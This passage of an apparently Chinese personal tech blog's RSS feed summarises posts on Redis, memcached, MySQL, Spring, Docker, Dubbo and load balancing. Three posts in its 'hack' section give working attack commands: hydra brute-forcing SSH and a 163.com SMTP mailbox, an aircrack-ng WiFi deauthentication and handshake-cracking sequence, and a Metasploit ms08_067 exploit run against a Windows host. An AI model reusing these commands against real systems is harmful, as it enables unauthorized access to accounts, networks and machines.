流程 当用户访问 www.google.com 时：
 浏览器先发送一个 DNS 请求， DNS 服务返回 VIP。 然后浏览器尝试与该 VIP 建立连接。 当路由器接收到 VIP 数据包，通过 ECMP 将数据包路由到 Maglev 集群中的某台机器上。 当 Maglev 的机器接收到数据包， 从关联到该 VIP 的 Endpoint 中选择一个， 然后用 GRE 封包发送，外层的 IP 即 Endpoint 的物理 IP。 当 Endpoint 处理完数据包进行响应时，源地址用 VIP 填充，目的地址为用户 IP。 使用直接服务返回(Direct Server Return， DSR) ，将响应直接发送给路由器， 这样 Maglev 无需处理响应包。    Google Maglev 结构   结构 Maglev 由控制器（Controller）和 转发器（Forwarder）组成：</description>
    </item>
    
    <item>
      <title>memcached</title>
      <link>https://www.wuxinvip.com/blog/cache/memcached/</link>
      <pubDate>Sat, 24 Mar 2018 00:00:00 +0000</pubDate>
      
      <guid>https://www.wuxinvip.com/blog/cache/memcached/</guid>
      <description>memcached
简介
Memcached的 Memcached.svg 开发者（S） Danga Interactive 初始发行 2003年5月22日 稳定版本 1.5.8 / 2018年5月25日; 39天前[1] 知识库 https://github.com/memcached/memcached 在维基数据上编辑此内容 写入 C 操作系统 跨平台 类型 分布式内存缓存系统 执照 修订BSD许可证[2] 网站 memcached .org Memcached（发音：mem-cash-dee，mem-cashed）是一种通用的分布式内存缓存系统。它通常用于通过在RAM中缓存数据和对象来加速动态数据库驱动的网站，以减少必须读取外部数据源（如数据库或API）的次数。Memcached是免费的开源软件，根据修订的BSD许可证授权。[2] Memcached在类Unix操作系统（至少是Linux和OS X）和Microsoft Windows上运行。这取决于libevent库。 Memcached的API提供了一个分布在多台机器上的非常大的哈希表。当表已满时，后续插入会导致较旧的数据以最近最少使用（LRU）顺序被清除。[3] [4]使用Memcached的应用程序通常将请求和添加分层到RAM中，然后再回到较慢的后备存储（例如数据库）上。 Memcached没有内部机制来跟踪可能发生的未命中，但是，某些第三方实用程序提供此功能。  数据结构
key-value【string】  特点
client-server 结构 服务端、维护key-value 互不通信 客户端、自行管理数据在各个服务间的分配  性能
get获取时间戳、懒校验 内存不足 LRU算法、主动淘汰 多核存储、集群性能要高于redis 内存利用率要高于redis  集群
服务器互相独立 客户端hash存储数据  </description>
    </item>
    
    <item>
      <title>mysql-care点</title>
      <link>https://www.wuxinvip.com/blog/mysql/mysql-care-point/</link>
      <pubDate>Sat, 24 Mar 2018 00:00:00 +0000</pubDate>
      
      <guid>https://www.wuxinvip.com/blog/mysql/mysql-care-point/</guid>
      <description> 查询缓存从 Mysql5.7.20开始已经弃用、并在MySQL8.0中删除  </description>
    </item>
    
    <item>
      <title>mysql存储过程</title>
      <link>https://www.wuxinvip.com/blog/mysql/mysql-stored-procedure/</link>
      <pubDate>Sat, 24 Mar 2018 00:00:00 +0000</pubDate>
      
      <guid>https://www.wuxinvip.com/blog/mysql/mysql-stored-procedure/</guid>
      <description>DELIMIT ; CREATE DROP (); DELIMIT //  为什么使用存储过程 有过统计:一个事务提交放到service层 大概一秒能处理500个(好像是2ms一个.算上网络延迟) 而使用mysql存储过程 一秒钟大概能处理2000个事物
阿里编码规范有讲不适用存储过程.维护起来很困难.但是该用还得用.像秒杀.</description>
    </item>
    
    <item>
      <title>mysql最大连接数</title>
      <link>https://www.wuxinvip.com/blog/mysql/mysql-max-connects/</link>
      <pubDate>Sat, 24 Mar 2018 00:00:00 +0000</pubDate>
      
      <guid>https://www.wuxinvip.com/blog/mysql/mysql-max-connects/</guid>
      <description>linux默认1000 window 默认2000
还要根据文件系统 性能 来调节 mysql连接数</description>
    </item>
    
    <item>
      <title>pouch</title>
      <link>https://www.wuxinvip.com/blog/container/pouch/</link>
      <pubDate>Sat, 24 Mar 2018 00:00:00 +0000</pubDate>
      
      <guid>https://www.wuxinvip.com/blog/container/pouch/</guid>
      <description>2017.11.19正式开源pouch
pouch 基于Apache2.0协议的容器技术
介绍： Pouch 是一个轻量级容器技术 特点：快速高效、可移植性高、资源占用少
github：pouch
11年基于Linux内核上的namespace、cgroup等技术开始成熟、阿里Pouch基于LXC研发的第一代容器t4 13年Docker横空出世、解决了行业多年的&amp;rdquo;软件封装&amp;rdquo;问题、阿里吸收其经验、打磨Pouch
Pouch规模 2017 年双 11，巨额交易 1682 亿背后，Pouch 在&amp;rdquo;超级工程&amp;rdquo;中做到了： 1、100% 的在线业务 Pouch 化 2、容器规模达到百万级
阿里集团内部，Pouch 的日常服务已经覆盖绝大部分的事业部， 覆盖的业务场景包括：电商、广告、搜索等； 覆盖技术栈包括：电商应用、数据库、大数据、流计算等； 覆盖编程语言：Java、C++、NodeJS 等。  Pouch 技术优势 1、隔离性强
众所周知，行业中的容器方案大多基于 Linux 内核提供的 cgroup 和 namespace 来实现隔离，然后这样的轻量级方案存在弊端： .容器间，容器与宿主间，共享同一个内核； .内核实现的隔离资源，维度不足。 面对如此的内核现状，阿里巴巴采取了三个方面的工作，来解决容器的安全问题： 用户态增强容器的隔离维度，比如网络带宽、磁盘使用量等； 给内核提交 patch，修复容器的资源可见性问题，cgroup 方面的 bug； 实现基于 Hypervisor 的容器，通过创建新内核来实现容器隔离。  2、P2P镜像分发
点对点分发镜像【相对于中央仓库分发镜像、极大见笑了中央仓库的网络压力】 工具：阿里巴巴镜像分发工具&amp;quot;蜻蜓&amp;quot;  蜻蜓地址
3、富容器技术
 Pouch 技术可以说对业务没有任何的侵入性，也正是因为这一点在集团内部做到 100% 容器化。 这样的容器技术，被无数阿里人称为“富容器”。 “富容器”技术的实现，主要是为了在 Linux 内核上创建一个与虚拟机体验完全一致的容器。 如此一来，比一般容器要功能强大，内部有完整的 init 进程，以及业务应用需要的任何服务，当然这也印证了 Pouch 为什么可以做到对应用没有“侵入性”。 技术的实现过程中，Pouch 需要将容器的执行入口定义为 systemd，而在内核态，Pouch 引入了 cgroup namespace 这一最新的内核 patch，满足 systemd 在富容器模式的隔离性。 从企业运维流程来看，富容器同样优势明显。 它可以在应用的 Entrypoint 启动之前做一些事情，比如统一要做一些安全相关的事情，运维相关的 agent 拉起。 这些需要统一做的事情，倘若放到用户的启动脚本，或镜像中就对用户的应用诞生了侵入性，而富容器可以透明的处理掉这些事情。  4、内核兼容性 可以理解为兼容老版本linux内核系统</description>
    </item>
    
    <item>
      <title>redis</title>
      <link>https://www.wuxinvip.com/blog/cache/redis/</link>
      <pubDate>Sat, 24 Mar 2018 00:00:00 +0000</pubDate>
      
      <guid>https://www.wuxinvip.com/blog/cache/redis/</guid>
      <description>1、使用ANSIC编写 （基于BSD协议） 2、开源、内存中数据结构存储 3、可以用作数据库、缓存、消息中间件
支持多种数据结构 String、hash、list、set、sorted sets、bitmaps、geospatial 字符串、散列、列表、集合、有序集合、bitmaps、地理空间
redis内置 复制(application) LUA脚本 LRU驱动事件、事物(transtrations) 和不同级别的硬盘持久化 并通过redis哨兵(sentinel)和自动分区(cluster)提高可用性
Redis支持每隔一段时间将数据导出磁盘、支持主从复制、且第一次是快速非阻塞形式
由于组合式压缩、内存使用率要高于memcached 其他：
事物 订阅分发 lua脚本 过期自动删除key 自动故障转移  优势
性能极高、读11W次/s 写8.1W次/s 丰富的数据类型 原子性操作 丰富特性、支持publish、sub scribe 通知 key过期等等  redis命令：
创建当前备份 save 恢复数据：config get dit &amp;quot;dir&amp;quot; &amp;quot;usr/local/redis/bin&amp;quot; 将dump移动到安装目录 并启动服务即可 创建备份： Bg save background saving started 该命令后台执行 恢复备份 redis-cli --rdb /tmp/dump.rdb 检查主从数据流：从模式 redis-cli --slave 从配置修改: slave-read-only yes 从数据库: slave of host:port 清空: flushall 远程连接: redis-cli -h host -p port -a password  redis发布订阅</description>
    </item>
    
    <item>
      <title>sleuth灵异事件</title>
      <link>https://www.wuxinvip.com/blog/spring-cloud-exception/sleuth-exception-1/</link>
      <pubDate>Sat, 24 Mar 2018 00:00:00 +0000</pubDate>
      
      <guid>https://www.wuxinvip.com/blog/spring-cloud-exception/sleuth-exception-1/</guid>
      <description>分布式 服务跟踪系统
客户端发送ok server端 启动ok 但是就是没有数据
``` 灵异原因：可能是版本不一致
要保证 客户端 cloud version 和sleuth server cloud version 版本一致 修改方式：
```` </description>
    </item>
    
    <item>
      <title>spring</title>
      <link>https://www.wuxinvip.com/blog/spring/spring/</link>
      <pubDate>Sat, 24 Mar 2018 00:00:00 +0000</pubDate>
      
      <guid>https://www.wuxinvip.com/blog/spring/spring/</guid>
      <description>特性:IOC　AOP
控制反转．面向切面编程
由spring创建obj.
独特的obj注入方式
执行过程切面管理
bean加载方式 spring cglib代理织入切面方法执行 </description>
    </item>
    
    <item>
      <title>spring Roo</title>
      <link>https://www.wuxinvip.com/blog/spring-cloud/spring-roo/</link>
      <pubDate>Sat, 24 Mar 2018 00:00:00 +0000</pubDate>
      
      <guid>https://www.wuxinvip.com/blog/spring-cloud/spring-roo/</guid>
      <description>what？ 使用命令行形式构建项目
下载地址：https://projects.spring.io/spring-roo/#running-from-shell
快速搭建：
 mkdir hello cd hello roo.sh roo&amp;gt; project setup --topLevelPackage com.foo roo&amp;gt; jpa setup --provider HIBERNATE --database HYPERSONIC_IN_MEMORY roo&amp;gt; entity jpa --class ~.domain.Timer roo&amp;gt; field string --fieldName message --notNull roo&amp;gt; repository jpa --all roo&amp;gt; service --all roo&amp;gt; web mvc setup roo&amp;gt; web mvc view setup --type THYMELEAF roo&amp;gt; web mvc controller --all --responseType THYMELEAF roo&amp;gt; web mvc controller --all --pathPrefix /api roo&amp;gt; quit mvn spring-boot:run  </description>
    </item>
    
    <item>
      <title>spring cloud 总 架构图</title>
      <link>https://www.wuxinvip.com/blog/spring-cloud/spring-cloud-1/</link>
      <pubDate>Sat, 24 Mar 2018 00:00:00 +0000</pubDate>
      
      <guid>https://www.wuxinvip.com/blog/spring-cloud/spring-cloud-1/</guid>
      <description>版权所有 转载 请表明出处
相关代码地址
纠正：
cli 是 结合grovy脚本 工程 consul 是服务注册中心 不过可以结合docker做更容易扩散的集群中心   总结下 ： 可以说 spring cloud 服务中 包括各种spring 基础服务也有了很多更新 有RPC 框架的 注册 netflix 有 关于配置的 远程仓库配置 config 有 关于消息 bus stream 有关于app的 for android (提供RestTemplate) 有关任务调度 的 task 有关于 shell 编程 有关于安全方面的 有关于系统拦截 zuul 等等。 那么看名字可以分为两种 1、Spring * --- spring 为了完善&amp;quot;应用&amp;quot;增加的功能机制 例如 spring security 、spring vault、等等 2、Spring Cloud * ---spring cloud * 是在 微服务中 为了&amp;quot;微服务系统&amp;quot;更方便的集成 对各个功能模块进行封装的结果、  </description>
    </item>
    
    <item>
      <title>spring cloud 族谱</title>
      <link>https://www.wuxinvip.com/blog/spring-cloud/spring-cloud-2/</link>
      <pubDate>Sat, 24 Mar 2018 00:00:00 +0000</pubDate>
      
      <guid>https://www.wuxinvip.com/blog/spring-cloud/spring-cloud-2/</guid>
      <description>功能简介来自官网 整理人：无心
总结下 ： 可以说 spring cloud 服务中 包括各种spring 基础服务也有了很多更新 有RPC 框架的 注册 netflix 有 关于配置的 远程仓库配置 config 有 关于消息 bus stream 有关于app的 for android (提供RestTemplate) 有关任务调度 的 task 有关于 shell 编程 有关于安全方面的 有关于系统拦截 zuul 等等。 那么看名字可以分为两种 1、Spring * --- spring 为了完善&amp;quot;应用&amp;quot;增加的功能机制 例如 spring security 、spring vault、等等 2、Spring Cloud * ---spring cloud * 是在 微服务中 为了&amp;quot;微服务系统&amp;quot;更方便的集成 对各个功能模块进行封装的结果、  </description>
    </item>
    
    <item>
      <title>spring-定时任务</title>
      <link>https://www.wuxinvip.com/blog/spring/spring-crontab/</link>
      <pubDate>Sat, 24 Mar 2018 00:00:00 +0000</pubDate>
      
      <guid>https://www.wuxinvip.com/blog/spring/spring-crontab/</guid>
      <description>@scheduled注解执行表
0 0 10,14,16 * * ? 每天上午10点，下午2点，4点 0 0/30 9-17 * * ? 朝九晚五工作时间内每半小时 0 0 12 ? * WED 表示每个星期三中午12点 &amp;quot;0 0 12 * * ?&amp;quot; 每天中午12点触发 &amp;quot;0 15 10 ? * *&amp;quot; 每天上午10:15触发 &amp;quot;0 15 10 * * ?&amp;quot; 每天上午10:15触发 &amp;quot;0 15 10 * * ? *&amp;quot; 每天上午10:15触发 &amp;quot;0 15 10 * * ? 2005&amp;quot; 2005年的每天上午10:15触发 &amp;quot;0 * 14 * * ?&amp;quot; 在每天下午2点到下午2:59期间的每1分钟触发 &amp;quot;0 0/5 14 * * ?</description>
    </item>
    
    <item>
      <title>springboot mybatis 配置</title>
      <link>https://www.wuxinvip.com/blog/spring-boot/spring-boot-1/</link>
      <pubDate>Sat, 24 Mar 2018 00:00:00 +0000</pubDate>
      
      <guid>https://www.wuxinvip.com/blog/spring-boot/spring-boot-1/</guid>
      <description>application.java 类上注解
遇到的问题 Factory method &amp;lsquo;sqlSessionFactory&amp;rsquo; threw exception; nested exception is java.io.FileNotFoundException: Could not open ServletContext resource [/false]
如果没有本地配置mybatis-config.xml的话 不要加这个配置</description>
    </item>
    
    <item>
      <title>spring官网提供的 spring boot实例</title>
      <link>https://www.wuxinvip.com/blog/spring-boot/open-source-project/</link>
      <pubDate>Sat, 24 Mar 2018 00:00:00 +0000</pubDate>
      
      <guid>https://www.wuxinvip.com/blog/spring-boot/open-source-project/</guid>
      <description>github开源项目&amp;ndash;springboot
= Spring Boot image:https://ci.spring.io/api/v1/teams/spring-boot/pipelines/spring-boot-2.0.x/jobs/build/badge[&amp;quot;Build Status&amp;rdquo;, link=&amp;ldquo;https://ci.spring.io/teams/spring-boot/pipelines/spring-boot-2.0.x?groups=Build&amp;quot;] image:https://badges.gitter.im/Join Chat.svg[&amp;ldquo;Chat&amp;rdquo;,link=&amp;ldquo;https://gitter.im/spring-projects/spring-boot?utm_source=badge&amp;amp;utm_medium=badge&amp;amp;utm_campaign=pr-badge&amp;amp;utm_content=badge&amp;quot;] :docs: https://docs.spring.io/spring-boot/docs/current-SNAPSHOT/reference
Spring Boot makes it easy to create Spring-powered, production-grade applications and services with absolute minimum fuss. It takes an opinionated view of the Spring platform so that new and existing users can quickly get to the bits they need.
You can use Spring Boot to create stand-alone Java applications that can be started using java -jar or more traditional WAR deployments.</description>
    </item>
    
    <item>
      <title>sringmvc</title>
      <link>https://www.wuxinvip.com/blog/spring/springmvc/</link>
      <pubDate>Sat, 24 Mar 2018 00:00:00 +0000</pubDate>
      
      <guid>https://www.wuxinvip.com/blog/spring/springmvc/</guid>
      <description>启动加载顺序
spring加载流程
 1.监听器加载spring 2.加载配置文件 3.工厂生产实例化对象 4.放入ServletContext  springmvc加载流程
 1.Servlet加载（监听器之后即执行）Servlet的init() 2.加载配置文件 3.从ServletContext拿到spring初始化springmvc相关对象 4.放入ServletContext  springmvc执行流程
 1.用户请求到DispatcherServlet 2.DispatcherServlet查找HandlerMapping请求Handler并返回查找结果 3.DispatcherServlet调用HandlerAdapter执行Handler并返回执行结果 4.DispatcherServlet调用ResolverView生成视图并返回视图 5.DispatcherServlet返回给用户  </description>
    </item>
    
    <item>
      <title>ssh远程登陆破解</title>
      <link>https://www.wuxinvip.com/blog/hack/ssh-violence/</link>
      <pubDate>Sat, 24 Mar 2018 00:00:00 +0000</pubDate>
      
      <guid>https://www.wuxinvip.com/blog/hack/ssh-violence/</guid>
      <description>利用ssh协议 暴力破解ssh密码
#hydra -s 22 -v -l root -P /usr/share/wordlists/rockyou.txt 192.168.0.108 ssh ssh 端口22 破解 # hydra -S -l test@163.com -P /usr/share/wordlists/rockyou.txt -e ns -V -s 465 -t 1 smtp.163.com smtp 邮箱破解 现在都加了许多验证.怕是不太靠谱了  </description>
    </item>
    
    <item>
      <title>what is the docker</title>
      <link>https://www.wuxinvip.com/blog/container/what-docker/</link>
      <pubDate>Sat, 24 Mar 2018 00:00:00 +0000</pubDate>
      
      <guid>https://www.wuxinvip.com/blog/container/what-docker/</guid>
      <description>what is docker?
百度 告诉我们docker是一个容器
作为java码头搬砖的 我想到了 spring也是叫做容器
那么容器是一个什么样的概念? 不由想到了水缸&amp;mdash;容器 容器装载水的 与水毫无关系
spring容器 IOC AOP 都晓得 IOC 把对象创建交给spring管理 然后加载到jvm中运行java 程序 AOP 面向切面编程.其实就是提供了一个切面模式.能够很好地控制类的加载顺序.或者类的执行顺序
但是本质上spring容器就是装载java程序的
那么docker? 装载各种程序的.暂时可以理解为一个系统.系统也是一个容器.装载我们运行的程序 window装载 exe. linux装载rpm. android 装载一类apk的程序 ios装载一类ipa的程序
那么官网是怎么吹皮的呢? Docker是推动集装箱运动的公司，也是唯一一家能够解决混合云中的每个应用的集装箱平台提供商。当今的企业面临数字化转型的压力，但受到现有应用程序和基础架构的制约，同时合理化日益多样化的云，数据中心和应用程序体系结构。Docker实现了应用程序和基础架构与开发人员和IT运营商之间的真正独立性，从而发挥其潜力，并创建更好的协作和创新模式。
docker给我们提供了什么样的先进功能? 也是我们要用它的原因
1.敏捷 通过13X加速软件开发和部署，并立即响应客户的需求。 2.可移植性 一劳永逸地消除“在我的机器上工作”。在本地和云环境中获得独立性。 3.安全 通过内置的安全功能和配置，在整个生命周期中提供更安全的应用程序。 4.节约成本 优化基础架构资源的使用并简化操作，以节省总成本的50％。
在使用上: 1.简单 Docker为应用创建和编排提供了强大的工具 2.透明度 采用开源技术和模块化设计构建，可轻松集成到现有环境中。 3.独立 Docker在开发人员和IT部门之间以及应用程序和基础架构之间创建了一个关注点，以解锁创新
在行业上 1.现代化传统应用[MTA] Docker的第一步是现有的应用程序组合。将现有应用程序打包到容器中可以立即提高安全性，降低成本并获得云的便携性。这种转换将现代属性应用于遗留应用程序 - 所有这些都不需要更改一行代码。
2.混合云 云迁移，多云或混合云基础架构需要应用程序的无缝移植。Docker将应用程序及其依赖关系打包到一个独立的容器中，使它们可以移植到任何基础架构中 一劳永逸地消除“在我的机器上工作”的问题。Docker认证的基础架构确保集装箱化的应用程序一直工作。
3.持续集成和部署[DEVOPS] 集成现代方法并通过集成Docker和DevOps来自动化开发流程。通过消除应用程序冲突并提高开发人员的生产力，容器的独立性使其有助于快速变化的环境。Docker实现了关注的真正分离，加速了DevOps流程的采用。
4.微服务 Docker容器在设计上是轻量级的，是实现微服务应用程序开发的理想选择。加速作为单个应用程序组成的数十个或数百个容器的开发，部署和回滚。无论是构建新的微服务还是将小块服务转换为更小的服务，简单易用的工具都可以轻松组合，部署和维护复杂的应用程序。
docker安装:https://docs.docker.com/engine/installation/
docker与虚拟机区别 可看出虚拟机拥有较强的隔离技术。虚拟机承载的镜像都是互相独立的。 而且虚拟机中执行的进程是被虚拟机管理的，并不与主机进程等价。
docker容器技术中，最主要一点就是容器进程与主机进程等价。省去了虚拟机进程管理的消耗。 但是这样也带来了问题。容器隔离度安全问题。
另外docker中可以两个应用共用一个库。而虚拟机因为隔离性太强，只能各用个的。</description>
    </item>
    
    <item>
      <title>wifi破解</title>
      <link>https://www.wuxinvip.com/blog/hack/wifi-violence/</link>
      <pubDate>Sat, 24 Mar 2018 00:00:00 +0000</pubDate>
      
      <guid>https://www.wuxinvip.com/blog/hack/wifi-violence/</guid>
      <description>利用网卡监控模式 监控wifi热点 .然后强制断开用户与路由连接.利用用户与路由四次握手机会获取握手包.然后跑字典
# airmon-ng # airmon-ng start wlan0 #wlan0为 上一个命令的Interface # airodump-ng wlan0mon # airodump-ng -c 6 --bssid C8:3A:35:30:3E:C8 -w ~/ wlan0mon -c 6:表示信道6 (ch) # aireplay-ng -0 2 -a C8:3A:35:30:3E:C8 -c B8:E8:56:09:CC:9C wlan0mon # airmon-ng stop wlan0mon # aircrack-ng -a2 -b C8:3A:35:30:3E:C8 -w /usr/share/wordlists/rockyou.txt ~/*.cap #跑字典  </description>
    </item>
    
    <item>
      <title>zsh</title>
      <link>https://www.wuxinvip.com/blog/shell/zsh/</link>
      <pubDate>Sat, 24 Mar 2018 00:00:00 +0000</pubDate>
      
      <guid>https://www.wuxinvip.com/blog/shell/zsh/</guid>
      <description>zsh 安装: zsh 又名终极shell 出名于 oh my zsh 可配置主题 还有很多插件 功能 在此用作文件默认开启程序 和 alias使用也是极大方便
centos:yum install zsh debian:apt-get install zsh  oh-my-zsh 安装:
# via curl curl -L https://raw.github.com/robbyrussell/oh-my-zsh/master/tools/install.sh | sh # via wget wget https://raw.github.com/robbyrussell/oh-my-zsh/master/tools/install.sh -O - | sh  设置zsh为系统默认shell:
# 为root用户修改默认shell为zsh chsh -s /bin/zsh root # 为当前用户修改默认shell为zsh chsh -s /bin/zsh # or chsh -s `which zsh` # 恢复命令 chsh -s /bin/bash  add to ~/.zshrc:
export PATH=$PATH:/usr/local/go/bin #export PATH=$PATH:/Applications/MAMP/bin/php/php5.</description>
    </item>
    
    <item>
      <title>zuul</title>
      <link>https://www.wuxinvip.com/blog/spring-cloud/zuul/</link>
      <pubDate>Sat, 24 Mar 2018 00:00:00 +0000</pubDate>
      
      <guid>https://www.wuxinvip.com/blog/spring-cloud/zuul/</guid>
      <description>zuul
是架设在整个springcloud微服务服务网中的门户模块 所有的外界访问请求 都要经过 这个模块 zuul结合eureka 可以做到动态服务代理
实现功能：
 1、身份验证和安全性-识别每个资源的身份验证要求并拒绝不满足的要求 2、洞察和检测-在边缘跟踪有意义的数据和统计数据、以便为我们提供准确的生产视图 3、动态路由-根据需要将请求动态路由到不同的后端集群 4、压力测试-逐渐增加到群集的流量，以衡量表现 5、加载Shedding-为每种类型的请求分配容量，并删除超出限制的请求 6、静态响应处理-直接边缘建立响应、而不是将他们转发到内部群集 7、多区域弹性-跨AWS区域的路由请求、以使我们的ELB使用多样化、并使我们的边缘更接近我们的成员  组件包含： zuul-core ：包含编译和执行过滤器的核心功能的库 zuul-simple-webapp ：它显示了如何用zuul-core 构建一个应用程序的简单例子 zuul-netflix ： 将其他NetflixOSS组件添加到Zuul的库 使用功能区来执行路由请求 zuul-netflix-webapp ：webapp 把zuul-core 和 zuul-netflix 组合成一个 易于使用的软件包  官方架构 </description>
    </item>
    
    <item>
      <title>一个HTTP请求究竟发生了什么</title>
      <link>https://www.wuxinvip.com/blog/technical-summary/technical-summary-1/</link>
      <pubDate>Sat, 24 Mar 2018 00:00:00 +0000</pubDate>
      
      <guid>https://www.wuxinvip.com/blog/technical-summary/technical-summary-1/</guid>
      <description>这个问题 去年 分析过一次
1、首先 请求从浏览器出发 2、到达 服务器 nginx 3、nginx分发给 各个服务容器 tomcat 4、tomcat 把请求发给 服务系统
5、服务 接收请求 由前端控制器 struts 或者 springmvc 接收 6、进行业务控制 service 7、获取业务数据 dao层 查询db 并返回 数据 8、数据 反向 dao &amp;mdash;-service&amp;mdash;controller 9、最后由springmvc 返回 不经历nginx 返回到浏览器
那么今年 结合新了解的 服务 更新这个列表
首先建立连接 【tcp ip 协议 】 1、三次握手 【过程】 2、经过的信息 源地址 ip 发送 一个请求连接包 到 目标地址 3、目标服务器 接收到信息 返回数据包 表明连接成功 可以继续发送请求
请求建立后 发送 https请求服务 服务会先到 目标地址的linux服务器 linux 先到网卡 网卡把请求 发给 linux端口服务 如果还有LVS负载均衡服务等服务、会把请求发送给负载服务器 如果没有LVS服务器 那么服务进入nginx等应用层负载均衡服务 nginx服务分发给各个端口 端口内是真是服务的地址</description>
    </item>
    
    <item>
      <title>事务</title>
      <link>https://www.wuxinvip.com/blog/jdk/jdk-translation/</link>
      <pubDate>Sat, 24 Mar 2018 00:00:00 +0000</pubDate>
      
      <guid>https://www.wuxinvip.com/blog/jdk/jdk-translation/</guid>
      <description>事务：用来保证几个操作一致性
 事务必须服从ISO/IEC所制定的ACID原则。 ACID是原子性（atomicity）、一致性（consistency）、隔离性 （isolation）和持久性（durability）的缩写。 事务的原子性表示事务执行过程中的任何失败都将导致事务所做的任何修改失效。 一致性表示 当事务执行失败时，所有被该事务影响的数据都应该恢复到事务执行前的状态。 隔离性表示在事务执行过程中对数据的修改，在事务提交之前对其他事务不可见。 持 久性表示已提交的数据在事务执行失败时，数据的状态都应该正确。  简单理解就是 保证一组sql语句的执行完整性、要么全部成功、要么全部失败 由于不同的业务环境对事物有不同的要求、通常把事物写到java程序中来控制sql语句通知db环境。 默认情况下是一条语句一个事物执行的
java.sql.Connection 中提供了对于事物的控制方法
public void setAutoCommit(boolean) public boolean getAutoCommit() public void commit() public void rollback()  JDBC的事务支持
JDBC对事务的支持体现在三个方面：
1.自动提交模式(Auto-commit mode)
Connection提供了一个auto-commit的属性来指定事务何时结束。
a.当auto-commit为true时，当每个独立SQL操作的执行完毕，事务立即自动提交，也就是说每个SQL操作都是一个事务。
一个独立SQL操作什么时候算执行完毕，JDBC规范是这样规定的：
对数据操作语言(DML，如insert,update,delete)和数据定义语言(如create,drop)，语句一执行完就视为执行完毕。
对select语句，当与它关联的ResultSet对象关闭时，视为执行完毕。
对存储过程或其他返回多个结果的语句，当与它关联的所有ResultSet对象全部关闭，所有update count(update,delete等语句操作影响的行数)和output parameter(存储过程的输出参数)都已经获取之后，视为执行完毕。
b. 当auto-commit为false时，每个事务都必须显示调用commit方法进行提交，或者显示调用rollback方法进行回滚。auto-commit默认为true。
JDBC提供了5种不同的事务隔离级别，在Connection中进行了定义。
2.事务隔离级别(Transaction Isolation Levels)
JDBC定义了五种事务隔离级别： TRANSACTION_NONE JDBC驱动不支持事务 TRANSACTION_READ_UNCOMMITTED 允许脏读、不可重复读和幻读。 TRANSACTION_READ_COMMITTED 禁止脏读，但允许不可重复读和幻读。 TRANSACTION_REPEATABLE_READ 禁止脏读和不可重复读，单运行幻读。 TRANSACTION_SERIALIZABLE 禁止脏读、不可重复读和幻读。  3.保存点(SavePoint)
JDBC定义了SavePoint接口，提供在一个更细粒度的事务控制机制。 当设置了一个保存点后，可以rollback到该保存点处的状态，而不是rollback整个事务。 Connection接口的setSavepoint和releaseSavepoint方法可以设置和释放保存点。  JDBC规范虽然定义了事务的以上支持行为，但是各个JDBC驱动，数据库厂商对事务的支持程度可能各不相同。如果在程序中任意设置，可能得不到想要的效果。为此，JDBC提供了DatabaseMetaData接口，提供了一系列JDBC特性支持情况的获取方法。比如，通过DatabaseMetaData.supportsTransactionIsolationLevel方法可以判断对事务隔离级别的支持情况，通过DatabaseMetaData.supportsSavepoints方法可以判断对保存点的支持情况。
与事务相关的理论
1.事务(Transaction)的四个属性(ACID) 原子性(Atomic) 对数据的修改要么全部执行，要么全部不执行。 一致性(Consistent) 在事务执行前后，数据状态保持一致性。 隔离性(Isolated) 一个事务的处理不能影响另一个事务的处理。 持续性(Durable) 事务处理结束，其效果在数据库中持久化。 2.</description>
    </item>
    
    <item>
      <title>使用Metasploit入侵windows</title>
      <link>https://www.wuxinvip.com/blog/hack/metasploit-hack-windows/</link>
      <pubDate>Sat, 24 Mar 2018 00:00:00 +0000</pubDate>
      
      <guid>https://www.wuxinvip.com/blog/hack/metasploit-hack-windows/</guid>
      <description>使用msfconsole 查看window发布的漏洞
运气好的话 你要破解的windows没有打补丁.那么使用该漏洞你就可以直接登陆到windows了
# msfconsole msf &amp;gt; search platform: windows xp sp3 msf &amp;gt; search platform: windows 10 msf &amp;gt; search platform: android msf &amp;gt; info exploit/windows/smb/ms08_067_netapi 使用info查看漏洞信息. msf &amp;gt; use exploit/windows/smb/ms08_067_netapi &amp;gt; set payload windows/meterpreter/bind_tcp &amp;gt; set RHOST 192.168.0.108 (设置目标主机IP地址) &amp;gt; exploit 设定攻击方式.攻击ip 攻击成功: [*] Started bind handler [*] Automatically detecting the target... [*] Fingerprint: Windows XP SP3 - Service Pack 3 - lang:Chinese [*] Selected Target: Windows XP SP3 Chinese (AlwaysOn NK) [*] Attempting to trigger the vulnerability.</description>
    </item>
    
    <item>
      <title>假如让你设计一个dubbo【一】</title>
      <link>https://www.wuxinvip.com/blog/rpc/dubbo-0/</link>
      <pubDate>Sat, 24 Mar 2018 00:00:00 +0000</pubDate>
      
      <guid>https://www.wuxinvip.com/blog/rpc/dubbo-0/</guid>
      <description>假设我们开发一个rpc远程调用框架
那么这个框架需要怎么去写
 1、首先有远程配置中心config 2、有服务代理层【包装业务上的服务做一个代理】 3、有服务注册中心【代理了服务之后 向该注册中心注册服务代理】 4、有路由【远程调用先走路由获取服务代理实例、集群必备的东西】 5、有远程调用层【发起服务调用】 6、有网络传输层、有信息交换层【这个是一个传输协议的实现层】 7、有序列化层【针对网络IO信息编码方式的统一、传输协议最基本的东西】 8、服务监控【不属于RPC、但是服务监控必不可少】  总结：
 核心配置：服务注册中心、服务代理和服务调用 优化配置：配置中心、服务监控、 基石配置：网络传输以及协议、序列化方式的定制  dubbo框架设计
简单用自己的语言描述这个图 * 1、左上角 Dubbo Framework * 2、左上角往右简单标识 每个颜色代表什么意思、更好理解图中数据流向 * 消费者、提供者、开始、接口、类、继承关系、调用链方向、依赖方向 * 3、左侧一竖列、黑体字 service\config、等等 * 服务接口【service】、配置层【config】、服务代理层【proxy】、注册中心【registry】、 * 路由【cluster】、监控中心【monitor】、远程调用【protocol】、 * 信息交换【exchange】、网络传输【transport】、数据序列化【serialize】
结合自己所想做一个分类
 核心配置：服务代理层【proxy】、注册中心【registry】、远程调用【protocol】 优化配置：配置层【config】、路由【cluster】、监控中心【monitor】 基石配置：信息交换【exchange】、网络传输【transport】、数据序列化【serialize】  简单猜想一下dubbo这么设计的代码架构
